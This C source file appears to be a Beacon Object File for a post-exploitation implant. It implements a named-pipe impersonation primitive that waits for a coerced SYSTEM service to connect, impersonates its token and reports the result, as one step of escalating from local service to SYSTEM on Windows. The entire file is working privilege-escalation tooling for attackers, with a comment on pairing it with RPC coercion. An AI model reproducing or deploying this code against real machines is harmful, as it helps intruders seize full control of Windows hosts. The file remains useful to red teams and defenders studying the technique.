/*
 * bof-getsystem-svc [pipename] [timeout-seconds]
 *
 * Named-pipe impersonation primitive for the local-service -> SYSTEM step.
 * Creates a named pipe, waits for a privileged client to connect, calls
 * ImpersonateNamedPipeClient and reports the resulting token.
 *
 * This BOF only provides the server half: you must trigger a SYSTEM service
 * to connect to the pipe (for example an RPC coercion or a service that
 * opens a client pipe).  Defaults: pipe `bof_getsystem`, 30 second wait.
 * The impersonation is reverted before returning, so use it to verify access
 * or combine it with another primitive.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "tokenhelpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *pipearg = "bof_getsystem";
    int plen = 0, timeout = 30;
    char path[MAX_PATH], line[512];
    HANDLE pipe, ev;
    OVERLAPPED ov;
    BOOL ok;
    DWORD err, wait;

    BeaconDataParse(&parser, args, alen);
    pipearg = BeaconDataExtract(&parser, &plen);
    if (!pipearg || !pipearg[0]) pipearg = "bof_getsystem";
    {
        int t = BeaconDataInt(&parser);
        if (t > 0 && t <= 600) timeout = t;
    }

    bof_strncpy(path, "\\\\.\\pipe\\", sizeof(path));
    bof_strncat(path, pipearg, sizeof(path) - bof_strlen(path) - 1);

    if (bof_strlen(path) >= 250) {
        BeaconPrintf(CALLBACK_ERROR, "pipe name too long\n");
        return;
    }

    pipe = KERNEL32$CreateNamedPipeA(path, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                                     PIPE_TYPE_BYTE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);
    if (pipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe(%s) failed: %lu\n", path,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    ev = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ev) {
        BeaconPrintf(CALLBACK_ERROR, "CreateEvent failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(pipe);
        return;
    }

    bof_memzero(&ov, sizeof(ov));
    ov.hEvent = ev;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] listening on %s (%d s)\n", path, timeout);

    ok = KERNEL32$ConnectNamedPipe(pipe, &ov);
    err = KERNEL32$GetLastError();
    if (!ok && err == ERROR_IO_PENDING) {
        wait = KERNEL32$WaitForSingleObject(ev, (DWORD)timeout * 1000);
        if (wait != WAIT_OBJECT_0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] no client connected within %d s\n", timeout);
            KERNEL32$CloseHandle(ev);
            KERNEL32$CloseHandle(pipe);
            return;
        }
    } else if (!ok && err != ERROR_PIPE_CONNECTED) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectNamedPipe failed: %lu\n", (unsigned long)err);
        KERNEL32$CloseHandle(ev);
        KERNEL32$CloseHandle(pipe);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] client connected\n");

    if (!ADVAPI32$ImpersonateNamedPipeClient(pipe)) {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateNamedPipeClient failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
    } else {
        HANDLE tok = NULL;
        if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY,
                                     TRUE, &tok)) {
            bof_token_line(tok, line, sizeof(line));
            KERNEL32$CloseHandle(tok);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] impersonated: %s\n", line);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] impersonating (token query failed: %lu)\n",
                         (unsigned long)KERNEL32$GetLastError());
        }
        ADVAPI32$RevertToSelf();
    }

    KERNEL32$DisconnectNamedPipe(pipe);
    KERNEL32$CloseHandle(ev);
    KERNEL32$CloseHandle(pipe);
}
